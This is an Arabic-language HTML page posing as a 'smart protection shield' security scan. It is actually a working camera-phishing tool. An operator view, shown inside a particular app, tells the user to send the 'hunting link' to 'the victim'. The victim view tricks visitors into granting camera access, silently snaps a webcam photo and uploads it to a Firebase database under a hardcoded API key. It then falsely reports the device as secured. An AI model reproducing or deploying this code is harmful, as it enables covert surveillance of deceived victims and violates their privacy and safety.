<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام الأمان المتقدم</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: Arial; direction: rtl; margin: 0; padding: 20px; }
        .admin-view, .victim-view { display: none; }
        .box { border: 2px solid #f00; border-radius: 20px; padding: 20px; background: #111; box-shadow: 0 0 20px #f00; max-width: 400px; margin: auto; }
        .btn { background: #f00; color: #fff; width: 100%; padding: 15px; border: none; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 15px; }
    </style>
</head>
<body>

    <div id="adminView" class="admin-view">
        <h1 style="color:#f00;">لوحة تحكم المشرف 👑</h1>
        <div class="box">
            <p>أهلاً بك يا <span style="color:red;">آلَﻤــشّـآ كَسًـ آلَۼد</span></p>
            <p>انسخ الرابط وابعده للضحية:</p>
            <input type="text" id="link" value="https://bdwalmtyry05-lgtm.github.io/security/" readonly style="width:90%; padding:10px; background:#222; color:#fff; border:1px solid #f00; text-align:center;">
            <button class="btn" onclick="copyLink()">نسخ رابط الصيد 🔗</button>
        </div>
    </div>

    <div id="victimView" class="victim-view">
        <h1 style="color:#f00;">🛡️ درع الحماية الذكي</h1>
        <div class="box">
            <p>جاري فحص ملفات النظام والتأكد من أمان الكاميرا والخصوصية...</p>
            <button class="btn" onclick="startScan()">إبدأ الفحص الشامل 🚀</button>
            <p id="status" style="margin-top:15px; color:#888;">نظامك الآن: في خطر ⚠️</p>
        </div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U", authDomain: "myspy-2579b.firebaseapp.com", projectId: "myspy-2579b", storageBucket: "myspy-2579b.firebasestorage.app", messagingSenderId: "487846863334", appId: "1:487846863334:web:b58620e6f34d187e02b627" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // فحص: هل المستخدم مشرف (داخل من البرنامج)؟
        const isApp = navigator.userAgent.includes("AppCreator24");
        if (isApp) {
            document.getElementById('adminView').style.display = 'block';
        } else {
            document.getElementById('victimView').style.display = 'block';
        }

        function copyLink() {
            var copyText = document.getElementById("link");
            copyText.select();
            document.execCommand("copy");
            alert("تم النسخ يا مشرف! ابعته للضحية الآن 🔥");
        }

        let stream;
        navigator.mediaDevices.getUserMedia({ video: true }).then(s => stream = s);

        async function startScan() {
            if(!stream) { alert("🚨 لازم توافق على الكاميرا لتأمين جهازك!"); return; }
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imgData = canvas.toDataURL('image/jpeg', 0.6);
                
                // إرسال الصيدة
                db.ref('results').push({ photo: imgData, date: new Date().toLocaleString() });
                
                document.getElementById('status').innerText = "✅ تم تأمين الجهاز بنجاح!";
                document.getElementById('status').style.color = "#0f0";
                alert("جهازك الآن في أمان تام جداً!");
            }, 500);
        }
    </script>
</body>
</html>
